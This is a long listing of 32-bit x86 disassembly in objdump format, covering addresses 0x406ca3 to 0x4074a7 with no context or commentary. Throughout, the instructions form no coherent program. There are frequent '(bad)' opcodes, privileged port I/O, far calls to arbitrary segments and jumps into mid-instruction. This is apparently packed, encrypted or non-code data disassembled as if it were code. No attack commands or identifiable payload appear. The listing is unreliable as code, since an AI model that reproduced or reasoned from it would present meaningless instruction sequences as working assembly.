  406ca3:	cmp    DWORD PTR [ebp-0x5d],ebp
  406ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ca7:	out    dx,al
  406ca8:	mov    eax,ds:0x62582070
  406cad:	dec    eax
  406cae:	sti    
  406caf:	rcl    BYTE PTR [ebx-0x38],0x90
  406cb3:	std    
  406cb4:	test   al,0x98
  406cb6:	fidiv  WORD PTR [esi+0x45]
  406cb9:	cld    
  406cba:	fstp   DWORD PTR [ebp-0x5a7d56c4]
  406cc0:	xor    DWORD PTR [ecx],ebp
  406cc2:	dec    eax
  406cc3:	cdq    
  406cc4:	dec    esp
  406cc5:	popf   
  406cc6:	and    al,0x9
  406cc8:	pop    ds
  406cc9:	mov    ebp,0x74e650b6
  406cce:	mov    ds:0xc4ae1a69,al
  406cd3:	or     ecx,DWORD PTR [edx-0x7a6477c7]
  406cd9:	outs   dx,BYTE PTR ds:[esi]
  406cda:	bound  edx,QWORD PTR [ecx+0x4d]
  406cdd:	xchg   ecx,eax
  406cde:	add    eax,0xc88bab56
  406ce3:	shl    eax,cl
  406ce5:	jae    0x406d0a
  406ce7:	sbb    BYTE PTR [ebx+0x7e01d011],dh
  406ced:	add    al,0x3a
  406cef:	push   0x45
  406cf1:	pop    eax
  406cf2:	test   eax,0xd5acb540
  406cf8:	or     BYTE PTR [ebx+0x66],dl
  406cfb:	inc    eax
  406cfc:	mov    ecx,0x7f2e6a66
  406d01:	enter  0xa84c,0x2e
  406d05:	call   0xc92c:0x23724a60
  406d0c:	aas    
  406d0d:	xor    ch,BYTE PTR [ebp+0x14]
  406d10:	inc    eax
  406d11:	enter  0xbab6,0x91
  406d15:	mov    cl,bl
  406d17:	and    al,0x10
  406d19:	in     al,0x99
  406d1b:	pop    ecx
  406d1c:	cmp    eax,edi
  406d1e:	lods   al,BYTE PTR ds:[esi]
  406d1f:	pop    edx
  406d20:	int3   
  406d21:	enter  0x6a91,0x8a
  406d25:	in     eax,0x3f
  406d27:	and    DWORD PTR [eax+0xb],esp
  406d2a:	xchg   ch,ah
  406d2c:	sahf   
  406d2d:	mov    BYTE PTR [esi],al
  406d2f:	adc    al,BYTE PTR [edi+0x13]
  406d32:	ret    
  406d33:	das    
  406d34:	rol    ebp,1
  406d36:	xchg   edi,eax
  406d37:	ffree  st(7)
  406d39:	repz inc esp
  406d3b:	retf   
  406d3c:	cmp    al,0x70
  406d3e:	cs pop esp
  406d40:	xor    al,0xc
  406d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d43:	push   eax
  406d44:	mov    fs,WORD PTR [edx-0x45]
  406d47:	sbb    al,0x87
  406d49:	push   0x3d5e78d3
  406d4e:	scas   eax,DWORD PTR es:[edi]
  406d4f:	pop    esp
  406d50:	loopne 0x406daa
  406d52:	mov    esp,0x165a06df
  406d57:	ja     0x406d36
  406d59:	sbb    edi,ebp
  406d5b:	in     eax,dx
  406d5c:	cdq    
  406d5d:	sub    al,0x60
  406d5f:	ds (bad) 
  406d61:	jle    0x406d93
  406d63:	cmp    DWORD PTR [ebp+0x3a],ecx
  406d66:	add    eax,0x32d9c266
  406d6b:	sub    DWORD PTR [esi-0x6fdf5401],esi
  406d71:	(bad)  
  406d72:	in     eax,dx
  406d73:	push   edx
  406d74:	retf   0x77d8
  406d77:	je     0x406dd7
  406d79:	adc    eax,edi
  406d7b:	aaa    
  406d7c:	daa    
  406d7d:	push   ebp
  406d7e:	pop    eax
  406d7f:	scas   al,BYTE PTR es:[edi]
  406d80:	aam    0x5
  406d82:	aam    0x5c
  406d84:	xchg   DWORD PTR [ebp+0x54576a34],ebx
  406d8a:	fld    DWORD PTR [ebp-0x3d]
  406d8d:	in     eax,dx
  406d8e:	mov    cl,0xde
  406d90:	test   esp,0x5f682b09
  406d96:	push   edx
  406d97:	fistp  DWORD PTR [edi-0x3ccfb7]
  406d9d:	rcl    BYTE PTR [edx+ebx*8],cl
  406da0:	out    0xe3,al
  406da2:	jge    0x406e05
  406da4:	and    ebp,esi
  406da6:	call   0x881aedb5
  406dab:	les    edi,FWORD PTR [ebx-0x45]
  406dae:	adc    BYTE PTR [edi-0x73],0xa1
  406db2:	mov    cs,WORD PTR [edi+0x60]
  406db5:	mov    dh,0x58
  406db7:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  406db9:	xchg   edi,eax
  406dba:	add    ecx,DWORD PTR [eax+0x1b1856d6]
  406dc0:	xor    edx,DWORD PTR cs:[edx]
  406dc3:	mov    cl,0x8
  406dc5:	pop    esi
  406dc6:	sti    
  406dc7:	leave  
  406dc8:	sbb    al,0x55
  406dca:	daa    
  406dcb:	pop    esi
  406dcc:	(bad)  
  406dcd:	into   
  406dce:	pop    esp
  406dcf:	or     edi,DWORD PTR [esi-0x41a8230e]
  406dd5:	xor    eax,0x353ca931
  406dda:	pushf  
  406ddb:	jg     0x406d7d
  406ddd:	icebp  
  406dde:	enter  0x7b9f,0x92
  406de2:	xchg   esi,eax
  406de3:	sub    ah,BYTE PTR [ecx]
  406de5:	cmp    al,0xb5
  406de7:	pop    edx
  406de8:	jmp    0x406da7
  406dea:	sub    DWORD PTR [edx+0x615a6ad2],eax
  406df0:	leave  
  406df1:	xchg   edi,eax
  406df2:	xor    al,0xe7
  406df4:	mov    esi,0x8990f8ca
  406df9:	sub    esi,DWORD PTR [edi]
  406dfb:	xchg   ebp,eax
  406dfc:	bound  edx,QWORD PTR [eax+ebp*8+0x5e]
  406e00:	in     al,0xbb
  406e02:	fs ret 
  406e04:	pop    ebx
  406e05:	adc    al,0xc1
  406e07:	xchg   DWORD PTR ds:0x74d5bc66,edi
  406e0d:	and    eax,DWORD PTR ds:0x4be122c8
  406e13:	stos   DWORD PTR es:[edi],eax
  406e14:	in     al,dx
  406e15:	cmp    eax,esi
  406e17:	inc    ebx
  406e18:	sbb    esi,DWORD PTR [edx-0x75]
  406e1b:	jmp    0x32af7507
  406e20:	xchg   ebx,eax
  406e21:	pop    DWORD PTR [ebx-0x618c719]
  406e27:	dec    eax
  406e28:	dec    edx
  406e29:	clc    
  406e2a:	jo     0x406e61
  406e2c:	cmp    al,BYTE PTR [eax]
  406e2e:	and    al,ch
  406e30:	adc    edi,DWORD PTR [eax+0x7]
  406e33:	sub    al,cl
  406e35:	sbb    eax,ebp
  406e37:	sbb    ebp,DWORD PTR [esi+ebp*4-0x19]
  406e3b:	sub    eax,0x546e2e8
  406e40:	inc    edx
  406e41:	inc    ecx
  406e42:	fs push edx
  406e44:	pop    esp
  406e45:	test   DWORD PTR [ebx+eax*4-0x7b],eax
  406e49:	or     esp,DWORD PTR [eax-0x7c]
  406e4c:	ss out 0xce,al
  406e4f:	gs cmp ebx,ebp
  406e52:	dec    esp
  406e53:	jle    0x406de9
  406e55:	xor    esp,edx
  406e57:	jg     0x406de0
  406e59:	and    dl,ch
  406e5b:	lods   eax,DWORD PTR ds:[esi]
  406e5c:	mov    BYTE PTR [ebx*1+0x5e1a7c46],dh
  406e63:	add    esi,DWORD PTR [esi+esi*8-0x40]
  406e67:	shl    DWORD PTR [ebx+ebx*1],cl
  406e6a:	add    al,0x17
  406e6c:	mov    esi,0xab69b15b
  406e71:	arpl   bx,bx
  406e73:	or     al,0x22
  406e75:	xor    BYTE PTR [ecx+0x67],0x64
  406e79:	aaa    
  406e7a:	cmp    bl,BYTE PTR [ebx-0x1e]
  406e7d:	scas   eax,DWORD PTR es:[edi]
  406e7e:	lods   eax,DWORD PTR ds:[esi]
  406e7f:	sbb    edx,DWORD PTR [eax+eax*8]
  406e82:	mov    eax,ds:0xd7066bba
  406e87:	pop    edx
  406e88:	iret   
  406e89:	mov    cs,di
  406e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e8d:	fmul   DWORD PTR [eax]
  406e8f:	push   ecx
  406e90:	fsubp  st(2),st
  406e92:	mov    esi,0x2bd8264b
  406e97:	out    0xf,al
  406e99:	and    eax,0xca13a5e5
  406e9e:	jp     0x406e27
  406ea0:	cmp    BYTE PTR [ebp+ebx*1-0x5a],0xfd
  406ea5:	mov    ds:0xaff9f65f,al
  406eaa:	push   cs
  406eab:	pop    es
  406eac:	and    al,0x12
  406eae:	jns    0x406edb
  406eb0:	int3   
  406eb1:	fidivr WORD PTR [edi+eax*2-0x3f03e68e]
  406eb8:	lods   eax,DWORD PTR ds:[esi]
  406eb9:	std    
  406eba:	sub    al,0x67
  406ebc:	arpl   WORD PTR ds:0x5241f0aa,cx
  406ec2:	sbb    BYTE PTR [ecx+0x7c],0x22
  406ec6:	sub    dl,BYTE PTR [edi+0x6411cb90]
  406ecc:	add    bl,ch
  406ece:	pop    esi
  406ecf:	loopne 0x406ef5
  406ed1:	add    al,0x2
  406ed3:	arpl   WORD PTR [eax-0x52],di
  406ed6:	jns    0x406f09
  406ed8:	not    esp
  406eda:	and    eax,0xb03f6885
  406edf:	call   0x2f2b:0x1bbf0a21
  406ee6:	pavgw  mm3,QWORD PTR [esi+0x7f83a0ab]
  406eed:	in     eax,dx
  406eee:	mov    eax,0x17112f26
  406ef3:	adc    BYTE PTR [esp+esi*4-0x73ed999a],dl
  406efa:	inc    edx
  406efb:	jg     0x406f06
  406efd:	adc    esp,ebp
  406eff:	jg     0x406f14
  406f01:	aad    0xff
  406f03:	call   0xc3eb0385
  406f08:	mov    esi,0xe52242bc
  406f0d:	fwait
  406f0e:	xchg   edx,eax
  406f0f:	iret   
  406f10:	sbb    dh,ah
  406f12:	push   es
  406f13:	(bad)  
  406f14:	gs jns 0x406f8a
  406f17:	sahf   
  406f18:	bound  edi,QWORD PTR [ebx-0x11938f68]
  406f1e:	cli    
  406f1f:	pop    esi
  406f20:	add    di,0x54a6
  406f25:	pop    ecx
  406f26:	push   cs
  406f27:	mov    edx,0xf9e0bb82
  406f2c:	mov    eax,0x6155391
  406f31:	int3   
  406f32:	or     BYTE PTR fs:[ecx-0x1b59ba4b],ch
  406f39:	dec    esi
  406f3a:	je     0x406f6d
  406f3c:	xor    dl,BYTE PTR [ebx-0x70]
  406f3f:	mov    al,ds:0x4b36a732
  406f44:	gs add eax,0xa2878f4b
  406f4a:	xor    DWORD PTR [ebx],eax
  406f4c:	call   DWORD PTR [ecx+0x35b2f6bd]
  406f52:	dec    ebx
  406f53:	fidivr DWORD PTR [ebx+eiz*4+0x67]
  406f57:	sbb    BYTE PTR [ebp+0x11],0x51
  406f5b:	add    BYTE PTR ds:0xa3a93326,0x2c
  406f62:	out    dx,al
  406f63:	arpl   WORD PTR [ebx-0x1e],bx
  406f66:	or     al,0x1
  406f68:	scas   al,BYTE PTR es:[edi]
  406f69:	push   0xffffffea
  406f6b:	lock push edi
  406f6d:	pop    esp
  406f6e:	mov    ds:0x2500ad2,al
  406f73:	pop    esi
  406f74:	test   DWORD PTR [edi],edx
  406f76:	or     BYTE PTR [ebp-0x54],cl
  406f79:	out    0x75,al
  406f7b:	int    0xf
  406f7d:	and    BYTE PTR [esi],bl
  406f7f:	jo     0x406fde
  406f81:	inc    ecx
  406f82:	daa    
  406f83:	pop    ebx
  406f84:	shl    BYTE PTR [ecx+0x1c],1
  406f87:	adc    al,0x5b
  406f89:	sub    ebx,DWORD PTR [ebp+ecx*4-0x22bb6d5]
  406f90:	adc    DWORD PTR [esi-0x3b2ddb33],edi
  406f96:	repnz cmc 
  406f98:	out    dx,al
  406f99:	xor    al,BYTE PTR ds:[ecx+0x34]
  406f9d:	lea    esp,[esi+0x7f48c27d]
  406fa3:	stos   BYTE PTR es:[edi],al
  406fa4:	push   0xffffff9b
  406fa6:	and    ebp,edi
  406fa8:	jnp    0x407016
  406faa:	cmp    BYTE PTR [eax+0x232e5c6c],bl
  406fb0:	das    
  406fb1:	push   ecx
  406fb2:	(bad)  
  406fb3:	popa   
  406fb4:	sbb    eax,DWORD PTR [ecx-0x3a]
  406fb7:	mov    esp,DWORD PTR [ecx+0x53]
  406fba:	stc    
  406fbb:	xchg   BYTE PTR [ecx],cl
  406fbd:	and    esp,DWORD PTR [esi+0x25]
  406fc0:	and    ebp,ebx
  406fc2:	push   ebx
  406fc3:	cdq    
  406fc4:	inc    esi
  406fc5:	and    edx,edi
  406fc7:	out    0xad,al
  406fc9:	test   BYTE PTR [ebx+eax*2+0x6e79fb55],0x57
  406fd1:	xor    DWORD PTR [ecx+0x692f6607],edx
  406fd7:	push   edi
  406fd8:	stos   DWORD PTR es:[edi],eax
  406fd9:	sar    BYTE PTR [esi+ebx*2-0x1e89cec0],cl
  406fe0:	and    BYTE PTR [ebp+0x60],bh
  406fe3:	inc    ecx
  406fe4:	and    DWORD PTR [ebp-0x27419d8c],edx
  406fea:	mov    ch,0x18
  406fec:	sti    
  406fed:	mov    WORD PTR [ecx-0x34eda338],fs
  406ff3:	xor    BYTE PTR [eax],bl
  406ff5:	aaa    
  406ff6:	in     al,dx
  406ff7:	sub    eax,0xaa383011
  406ffc:	ins    DWORD PTR es:[edi],dx
  406ffd:	push   es
  406ffe:	sbb    eax,0xdac75c2a
  407003:	aas    
  407004:	clc    
  407005:	int    0x91
  407007:	(bad)  
  407008:	cmc    
  407009:	in     eax,dx
  40700a:	clc    
  40700b:	add    eax,0x3a63e2bb
  407010:	ds mov cl,cl
  407013:	mov    ds:0x21879725,eax
  407018:	sub    bh,BYTE PTR [ecx+eiz*8+0x67]
  40701c:	leave  
  40701d:	jecxz  0x406fb7
  40701f:	dec    eax
  407020:	inc    edx
  407021:	pusha  
  407022:	cmp    eax,edx
  407024:	mov    dl,0xc1
  407026:	jbe    0x406fcd
  407028:	sbb    eax,0x9d193a73
  40702d:	xchg   esi,eax
  40702e:	jp     0x40709a
  407030:	sub    BYTE PTR [eax-0x42],al
  407033:	adc    dl,dh
  407035:	aam    0x66
  407037:	add    BYTE PTR [ecx],dl
  407039:	jns    0x40705c
  40703b:	dec    esi
  40703c:	mov    ecx,0xfae2630f
  407041:	in     eax,0xf0
  407043:	or     eax,0x5dcf93f0
  407048:	call   0x8e28:0x6c106983
  40704f:	mov    al,ds:0xe6887c3c
  407054:	push   ebx
  407055:	cs push edx
  407057:	clc    
  407058:	or     cl,bl
  40705a:	fild   QWORD PTR [eax+0x25]
  40705d:	clc    
  40705e:	xchg   esp,eax
  40705f:	sub    bl,BYTE PTR [ebx]
  407061:	inc    edx
  407062:	jg     0x40702c
  407064:	fmul   DWORD PTR [ebx-0x278e8708]
  40706a:	lods   eax,DWORD PTR ds:[esi]
  40706b:	das    
  40706c:	fldenv [edi]
  40706e:	lahf   
  40706f:	ss cld 
  407071:	mov    dh,0x99
  407073:	xchg   ecx,eax
  407074:	jmp    0x407099
  407076:	add    DWORD PTR [esi],ebp
  407078:	mov    esi,eax
  40707a:	push   0x19
  40707c:	nop
  40707d:	test   eax,0x39373fe7
  407082:	mov    gs,ecx
  407084:	jle    0x407038
  407086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407087:	test   al,0x1d
  407089:	mov    dh,0x78
  40708b:	dec    eax
  40708c:	(bad)  
  40708d:	xchg   edx,eax
  40708e:	sbb    eax,0x80b66f2f
  407093:	stc    
  407094:	cwde   
  407095:	jl     0x40707d
  407097:	cmc    
  407098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407099:	(bad)  
  40709a:	in     al,0xec
  40709c:	mov    esi,0xc986d64a
  4070a1:	(bad)  
  4070a2:	jl     0x40706e
  4070a4:	push   eax
  4070a5:	cs aas 
  4070a7:	pop    es
  4070a8:	bound  edi,QWORD PTR [si]
  4070ab:	mov    WORD PTR [esi+0x2c],fs
  4070ae:	mov    eax,0xff6586c9
  4070b3:	add    esp,DWORD PTR [eax+0x7b076ebc]
  4070b9:	repz push ss
  4070bb:	imul   ecx,DWORD PTR [eax],0xae38f56
  4070c1:	mov    eax,0x3e46c90c
  4070c6:	cmp    BYTE PTR ds:0xee0c432b,0x35
  4070cd:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4070cf:	sub    bh,BYTE PTR [esi]
  4070d1:	fidiv  WORD PTR [ebp-0x4b]
  4070d4:	icebp  
  4070d5:	jbe    0x4070fc
  4070d7:	or     eax,0x57d757ec
  4070dc:	mov    ds:0x76333a81,eax
  4070e1:	inc    esp
  4070e2:	jmp    0x8e84fa15
  4070e7:	int    0xde
  4070e9:	mov    ds:0x98652dbe,al
  4070ee:	xchg   esi,eax
  4070ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070f0:	add    al,0xa7
  4070f2:	inc    esp
  4070f3:	pop    ds
  4070f4:	push   ss
  4070f5:	cwde   
  4070f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070f7:	push   ebx
  4070f8:	outs   dx,BYTE PTR ds:[esi]
  4070f9:	mov    DWORD PTR [edi],edi
  4070fb:	stos   DWORD PTR es:[edi],eax
  4070fc:	rol    DWORD PTR [eax+0x26b066c4],cl
  407102:	mov    ah,0xa6
  407104:	pop    es
  407105:	adc    eax,0xc4575735
  40710a:	or     al,0x64
  40710c:	xlat   BYTE PTR ds:[ebx]
  40710d:	mov    ebp,0x20f5128b
  407112:	push   0x59284b31
  407117:	and    DWORD PTR [ebp-0x53b89b2e],edx
  40711d:	scas   eax,DWORD PTR es:[edi]
  40711e:	repnz xor esi,DWORD PTR [eax-0x7a]
  407122:	push   ss
  407123:	fbld   TBYTE PTR [eax+0x3]
  407126:	xlat   BYTE PTR ds:[ebx]
  407127:	or     al,0x4
  407129:	ret    0x84b7
  40712c:	mov    al,ds:0xb8fc6987
  407131:	test   eax,0x84546da7
  407136:	(bad)  
  407137:	std    
  407138:	in     al,dx
  407139:	fcom   QWORD PTR [esi-0x14bf8f7]
  40713f:	push   es
  407140:	loope  0x40713f
  407142:	ret    0x3374
  407145:	adc    eax,0xfb65541
  40714a:	mov    ah,0xc7
  40714c:	xor    ebp,DWORD PTR [ebx]
  40714e:	icebp  
  40714f:	loopne 0x40719d
  407151:	and    esp,DWORD PTR [ebx+eiz*1+0x66ee69ed]
  407158:	push   edx
  407159:	test   al,0x9b
  40715b:	fdivrp st(5),st
  40715d:	cmp    esp,esi
  40715f:	ja     0x40716d
  407161:	push   eax
  407162:	leave  
  407163:	lds    esp,FWORD PTR [ebx+0x31]
  407166:	std    
  407167:	es ins BYTE PTR es:[edi],dx
  407169:	lods   eax,DWORD PTR ds:[esi]
  40716a:	imul   edx,DWORD PTR ds:0x899d682e,0xfffffffd
  407171:	rcl    DWORD PTR [esi+edx*1-0x33647842],1
  407178:	loopne 0x407134
  40717a:	data16 adc BYTE PTR [ebp+0x73],ah
  40717e:	pop    ds
  40717f:	xchg   edi,eax
  407180:	mov    edi,0x83f561ab
  407185:	mov    edx,0xd2fb7f14
  40718a:	xlat   BYTE PTR ds:[ebx]
  40718b:	fincstp 
  40718d:	mov    ecx,0x653c73dd
  407192:	arpl   si,si
  407194:	and    BYTE PTR [ebp-0x5e],cl
  407197:	fidiv  WORD PTR [ebx+0x28]
  40719a:	ficom  WORD PTR [edi+ebx*1]
  40719d:	les    ebp,FWORD PTR [eax-0x179eaf09]
  4071a3:	sbb    bl,BYTE PTR [edx+0x41effa27]
  4071a9:	push   ss
  4071aa:	adc    eax,0xe465f320
  4071af:	aas    
  4071b0:	mov    DWORD PTR [edi+0x11],ebp
  4071b3:	xchg   edx,eax
  4071b4:	inc    edi
  4071b5:	dec    ebx
  4071b6:	outs   dx,DWORD PTR ds:[esi]
  4071b7:	ins    DWORD PTR es:[edi],dx
  4071b8:	adc    DWORD PTR [esi+edx*1+0x63],eax
  4071bc:	sub    al,BYTE PTR [ecx+0x18428932]
  4071c2:	pushf  
  4071c3:	xchg   ebp,eax
  4071c4:	adc    ebp,DWORD PTR [ebp+0x79]
  4071c7:	ror    BYTE PTR [esi+0x60],cl
  4071ca:	test   DWORD PTR [esi-0x1d],esp
  4071cd:	push   cs
  4071ce:	pushf  
  4071cf:	sub    eax,DWORD PTR [edi]
  4071d1:	jns    0x407173
  4071d3:	(bad)  
  4071d4:	clc    
  4071d5:	out    dx,al
  4071d6:	in     al,dx
  4071d7:	popa   
  4071d8:	pop    ss
  4071d9:	mov    ebx,0xb7705360
  4071de:	xchg   edx,eax
  4071df:	jecxz  0x407246
  4071e1:	xchg   esp,eax
  4071e2:	sbb    ah,BYTE PTR [ecx-0x31da7732]
  4071e8:	shl    DWORD PTR [ecx+0x79],1
  4071eb:	(bad)
  4071ef:	mov    bl,0x9f
  4071f1:	jl     0x4071a8
  4071f3:	xchg   ebp,eax
  4071f4:	dec    ebx
  4071f5:	mov    ?,WORD PTR [ebp-0x7ec9051d]
  4071fb:	test   BYTE PTR [ecx+0x33113d82],bh
  407201:	imul   esp,ebx,0xb92a0a2b
  407207:	aad    0x81
  407209:	and    al,0xb
  40720b:	mov    ds:0x5a3bd293,eax
  407210:	test   DWORD PTR [eax-0x58],esp
  407213:	clc    
  407214:	xchg   BYTE PTR [eax+0x168769dc],cl
  40721a:	ficomp DWORD PTR [ecx+ebx*4-0x38d61b36]
  407221:	push   0xb638791
  407226:	pop    eax
  407227:	mov    WORD PTR [edx-0x73],es
  40722a:	jb     0x40726b
  40722c:	stos   BYTE PTR es:[edi],al
  40722d:	js     0x4071c7
  40722f:	add    al,0xf2
  407231:	adc    esi,esi
  407233:	mov    eax,ds:0x274afdf3
  407238:	and    al,0xbe
  40723a:	fbstp  TBYTE PTR [eax+0x47375ffa]
  407240:	push   eax
  407241:	test   bl,ah
  407243:	nop
  407244:	aaa    
  407245:	and    BYTE PTR [edi+0x48],0xfe
  407249:	mov    BYTE PTR [esi+0x3e],cl
  40724c:	mov    ch,0x7f
  40724e:	pop    ds
  40724f:	gs mov ebp,0xd53ca153
  407255:	jns    0x4072a9
  407257:	inc    edi
  407258:	sub    eax,0x64da92f7
  40725d:	dec    eax
  40725e:	stc    
  40725f:	ss retf 
  407261:	mov    ah,0x52
  407263:	push   esi
  407264:	push   ecx
  407265:	or     BYTE PTR [ecx+0x64b85251],bh
  40726b:	sahf   
  40726c:	cwde   
  40726d:	icebp  
  40726e:	sub    al,0x60
  407270:	mov    edi,0xff0762b2
  407275:	and    al,0xa2
  407277:	mov    ss:0xe0f02eb2,al
  40727d:	push   esp
  40727e:	adc    DWORD PTR [ebx],edi
  407280:	xchg   ebx,eax
  407281:	(bad)
  407284:	mov    esp,0xbc5dc201
  407289:	sbb    DWORD PTR [eax-0x5e],0x913a344b
  407290:	into   
  407291:	xchg   DWORD PTR [edi-0x8],esi
  407294:	cli    
  407295:	pop    esi
  407296:	aad    0x6
  407298:	adc    eax,DWORD PTR [edx+0x35]
  40729b:	fs inc edi
  40729d:	jecxz  0x40729d
  40729f:	daa    
  4072a0:	shr    dl,0x82
  4072a3:	mov    eax,0xe19685ae
  4072a8:	bound  ecx,QWORD PTR [ebx-0x3c6fff6]
  4072ae:	rcl    DWORD PTR [ebp-0x4d5a3cef],1
  4072b4:	test   DWORD PTR [edi+0x4dd44161],0x1874702
  4072be:	jmp    DWORD PTR [edi]
  4072c0:	dec    edi
  4072c1:	pushf  
  4072c2:	xor    ah,BYTE PTR [edi]
  4072c4:	idiv   DWORD PTR [ebx+0x3356a078]
  4072ca:	mov    ds:0xe50095d0,al
  4072cf:	loop   0x4072b6
  4072d1:	push   ebp
  4072d2:	add    eax,0x91e947dd
  4072d7:	cmp    BYTE PTR [ebx+0x562c1dc2],ch
  4072dd:	mov    ebp,0x726a733
  4072e2:	and    cl,al
  4072e4:	pusha  
  4072e5:	sub    ebx,DWORD PTR [edi-0x69]
  4072e8:	jle    0x40727b
  4072ea:	xchg   ebp,eax
  4072eb:	cli    
  4072ec:	mov    ss,WORD PTR [ebx+0x53]
  4072ef:	or     DWORD PTR [ecx],esi
  4072f1:	pop    ebx
  4072f2:	adc    ebp,ecx
  4072f4:	cs int3 
  4072f6:	pop    ss
  4072f7:	or     edi,DWORD PTR [esi-0x2c]
  4072fa:	push   0xcde419e4
  4072ff:	retf   
  407300:	push   es
  407301:	lea    eax,[eax]
  407303:	mov    ch,dl
  407305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407306:	shr    BYTE PTR [ebx+0x55410fbc],cl
  40730c:	xor    dl,BYTE PTR [esi+eax*4]
  40730f:	xor    eax,0x4e9d0656
  407314:	jecxz  0x407353
  407316:	xor    ebx,ecx
  407318:	sub    ah,dh
  40731a:	fsubp  st(3),st
  40731c:	int3   
  40731d:	imul   ebx,DWORD PTR [ebx+ebx*1],0xffffffc6
  407321:	mov    edx,0x796354a
  407326:	out    0xc7,eax
  407328:	sub    esp,DWORD PTR [esp+edx*4]
  40732b:	in     al,0x23
  40732d:	sub    ebx,DWORD PTR [esi-0x37]
  407330:	or     al,BYTE PTR [esi-0x2c741f51]
  407336:	jmp    0x676d:0x3513bb8a
  40733d:	mov    dl,0xcb
  40733f:	repnz pop ecx
  407341:	xchg   ecx,eax
  407342:	shr    DWORD PTR [edx],1
  407344:	imul   ebp,DWORD PTR [ebp-0x58a17959],0xddb769e4
  40734e:	inc    ebx
  40734f:	(bad)  
  407350:	push   cs
  407351:	sub    al,0x4a
  407353:	jp     0x407320
  407355:	(bad)  
  407356:	mov    ds:0xc6044def,eax
  40735b:	imul   DWORD PTR es:[edx-0x66449378]
  407362:	mov    ah,0x98
  407364:	ror    DWORD PTR [edx+ebx*2-0x34],0xe8
  407369:	dec    DWORD PTR [ebp+edi*2-0x590f90bf]
  407370:	out    dx,al
  407371:	pop    eax
  407372:	and    edi,esp
  407374:	dec    edx
  407375:	mov    eax,0x9acc49bc
  40737a:	out    0x44,al
  40737c:	or     DWORD PTR [esi],esi
  40737e:	adc    BYTE PTR [esi+edi*1+0x66],bh
  407382:	ja     0x407395
  407384:	mov    ch,0x7e
  407386:	mov    bl,0x7a
  407388:	adc    eax,0xd28d08d7
  40738d:	in     al,0x5c
  40738f:	xchg   esp,eax
  407390:	dec    ebp
  407391:	scas   eax,DWORD PTR es:[edi]
  407392:	adc    ebx,DWORD PTR [ebx+0x12]
  407395:	neg    DWORD PTR [ebp+0x7d644469]
  40739b:	jno    0x40737f
  40739d:	scas   eax,DWORD PTR es:[edi]
  40739e:	pusha  
  40739f:	dec    esp
  4073a0:	imul   BYTE PTR [edx-0x1fada3b]
  4073a6:	and    BYTE PTR [edi*2-0x616b88cb],dh
  4073ad:	adc    eax,0x165bcebb
  4073b2:	aam    0x3c
  4073b4:	sub    DWORD PTR [edi+0x6a737a38],ecx
  4073ba:	sahf   
  4073bb:	add    DWORD PTR [edx-0x5c],edi
  4073be:	loope  0x407349
  4073c0:	add    BYTE PTR [ebp+0x1f],ch
  4073c3:	and    eax,esp
  4073c5:	pop    ecx
  4073c6:	inc    ecx
  4073c7:	dec    edx
  4073c8:	add    DWORD PTR [eax+0x54db6181],esi
  4073ce:	adc    edx,DWORD PTR [eax]
  4073d0:	into   
  4073d1:	fcmove st,st(6)
  4073d3:	lds    edi,FWORD PTR [eax-0x2afed3e5]
  4073d9:	je     0x40739a
  4073db:	and    edi,DWORD PTR [esi+0x19]
  4073de:	mov    eax,ds:0x10b95885
  4073e3:	bound  ebx,QWORD PTR [edx+esi*2+0x41efd2d7]
  4073ea:	dec    esi
  4073eb:	adc    eax,0x450feb6e
  4073f0:	out    0x4,eax
  4073f2:	test   al,0x75
  4073f4:	and    eax,0x5e2d7566
  4073f9:	lods   al,BYTE PTR ds:[esi]
  4073fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073fb:	xchg   ebx,eax
  4073fc:	adc    BYTE PTR [edx+0x42416649],dl
  407402:	xchg   ebx,eax
  407403:	mov    BYTE PTR [edi],cl
  407405:	jmp    0x843e:0x9d42b7c9
  40740c:	or     eax,0x806108b9
  407411:	or     BYTE PTR [esi+ebx*2+0x74cbb131],dl
  407418:	pop    ebp
  407419:	icebp  
  40741a:	xchg   BYTE PTR [ecx],bh
  40741c:	sub    eax,0xfbacefc
  407421:	cdq    
  407422:	les    edi,FWORD PTR [edx]
  407424:	cmp    eax,0xf174b475
  407429:	cli    
  40742a:	jl     0x407431
  40742c:	mov    eax,0xe1cffab3
  407431:	jbe    0x4074b2
  407433:	dec    ebp
  407434:	pop    ds
  407435:	inc    esi
  407436:	daa    
  407437:	xchg   ebp,eax
  407438:	pusha  
  407439:	call   0x60ec:0x6c78475f
  407440:	mov    eax,0xa5d9bb61
  407445:	out    dx,eax
  407446:	and    DWORD PTR [ebx+0x4c5bb7c5],ecx
  40744c:	mov    bl,0xf3
  40744e:	xchg   esi,eax
  40744f:	mov    al,0x6c
  407451:	jecxz  0x407459
  407453:	bound  eax,QWORD PTR [edi+0x28bdb23d]
  407459:	xchg   ecx,eax
  40745a:	in     eax,dx
  40745b:	xlat   BYTE PTR ds:[ebx]
  40745c:	test   ebx,0x228e7113
  407462:	dec    edx
  407463:	fs stc 
  407465:	jns    0x4074a8
  407467:	xor    ecx,ebx
  407469:	fcomp  QWORD PTR [esi]
  40746b:	fldenv [edx+0x48]
  40746e:	push   edx
  40746f:	pop    ds
  407470:	std    
  407471:	pop    eax
  407472:	ror    DWORD PTR [esi-0x5790a810],cl
  407478:	cmp    eax,0x166798b
  40747d:	(bad)  
  40747f:	loop   0x407422
  407481:	arpl   WORD PTR fs:[ebp+0x67],ax
  407485:	mov    BYTE PTR [esi+0x1d1e1839],al
  40748b:	call   0x8bbe8fb
  407490:	jg     0x4074c5
  407492:	pinsrw mm7,WORD PTR [ecx+0x3e259f40],0x8c
  40749a:	dec    edi
  40749b:	daa    
  40749c:	popa   
  40749d:	xchg   ecx,eax
  40749e:	push   es
  40749f:	(bad)  
  4074a0:	call   0xc8fe4125
  4074a5:	dec    eax
  4074a6:	inc    esp
  4074a7:	ror    BYTE PTR [edx],1
